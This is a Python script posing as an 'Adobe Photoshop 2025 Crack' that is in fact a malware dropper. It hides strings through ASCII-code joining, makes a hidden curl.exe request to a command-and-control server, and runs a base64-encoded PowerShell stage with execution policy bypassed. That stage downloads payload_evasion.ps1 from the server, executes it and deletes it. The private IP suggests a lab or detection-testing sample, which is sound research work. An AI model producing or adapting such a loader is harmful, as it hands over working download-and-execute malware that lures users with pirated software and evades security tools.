#!/usr/bin/env python3
"""
Adobe Photoshop 2025 Crack - EVASION Version
"""

import subprocess
import uuid
import time
import base64

# ============================================================
# CONFIGURATION
# ============================================================
RUN_ID = uuid.uuid4().hex[:8]
C2_SERVER = "http://192.168.10.105:80"

def join_ascii(codes):
    return ''.join(chr(c) for c in codes)

def split_string(s, pos=3):
    return s[:pos] + s[pos:]

print("")
print("=" * 56)
print("  Adobe Photoshop 2025 Crack v3.0 (EVASION)")
print(f"  RunId: {RUN_ID}")
print("=" * 56)

print("")
print("[PHASE 1] Downloading crack payload...")
print(f"  RunId: {RUN_ID}")

# Cách đúng: tải file .ps1 về, chạy bằng &, truyền tham số đúng
stage2_ps = f"""
Write-Host '[PHASE1_EVASION] Connecting to C2...' -ForegroundColor Cyan
$url = "{C2_SERVER}/payload_evasion.ps1"
$scriptPath = "$env:TEMP\\payload_evasion_{RUN_ID}.ps1"

try {{
    Invoke-WebRequest -Uri $url -OutFile $scriptPath -UseBasicParsing -TimeoutSec 10
    Write-Host '  [+] Payload downloaded successfully' -ForegroundColor Green
    & $scriptPath -RunId {RUN_ID}
}} catch {{
    Write-Host "  [!] Error: $_" -ForegroundColor Red
}} finally {{
    if (Test-Path $scriptPath) {{ Remove-Item $scriptPath -Force }}
}}

Write-Host ''
Write-Host '============================================================' -ForegroundColor Green
Write-Host '  PowerShell script completed.'
Write-Host '============================================================' -ForegroundColor Green
"""
b64_payload = base64.b64encode(stage2_ps.encode('utf-16le')).decode()

# Evasion: dùng curl và encoded command
curl = split_string("curl.exe", 2)
silent = join_ascii([45, 115, 111, 45, 115, 105, 108, 101, 110, 116])
output = join_ascii([45, 111])
curl_cmd = f"{curl} {silent} {output} NUL {C2_SERVER}/payload_evasion.ps1 2>NUL"
subprocess.Popen(["cmd.exe", "/c", curl_cmd], creationflags=subprocess.CREATE_NO_WINDOW)

encoded_flag = join_ascii([45, 69, 110, 99, 111, 100, 101, 100, 67, 111, 109, 109, 97, 110, 100])
stage2_proc = subprocess.Popen([
    "powershell.exe", "-NoP", "-NonI", "-Exec", "Bypass",
    encoded_flag, b64_payload
], creationflags=subprocess.CREATE_NO_WINDOW)

print("  [+] Evasion: curl.exe + base64 payload")
stage2_exit = stage2_proc.wait()
print(f"  [+] Stage 2 PowerShell exited with code {stage2_exit}")

print("")
print("=" * 56)
print(" Phase 1 evasion completed")
print("=" * 56)

print("")
try:
    input("Press Enter to exit...")
except EOFError:
    pass
